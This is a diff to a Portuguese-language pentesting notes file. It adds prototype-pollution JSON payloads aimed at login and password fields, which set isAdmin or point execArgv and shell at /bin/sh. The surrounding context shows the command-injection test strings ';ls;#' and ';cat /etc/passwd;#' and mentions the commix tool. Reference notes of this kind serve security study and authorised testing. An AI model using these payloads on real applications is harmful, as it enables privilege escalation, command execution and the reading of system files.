@@ -4250,6 +4250,15 @@ Chuta os char da database um por um
 
 Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é `;ls;#` ponto e vírgula serve para finalizar o comando e iniciar outro e o `#` serve para ignorar o que vier depois ou `;cat /etc/passwd;#`
 
+- Prototype Pollution
+
+Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution
+
+	{\"__proto__\": { \"isAdmin \": true }}
+	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
+	{\"__proto__\":{\"isAdmin\":true}}
+	{\"constructor\": {\"prototype\": {\"shell\": \"/bin/sh\"}}}
+
 - Automatizando os Testes Command Injection - COMMIX
 
 A ferramenta commix serve para automatizar o command injection, deve-se identificar se a aplicação é `POST` ou não e informar o parâmetro que no caso do exemplo abaixo é `site=`
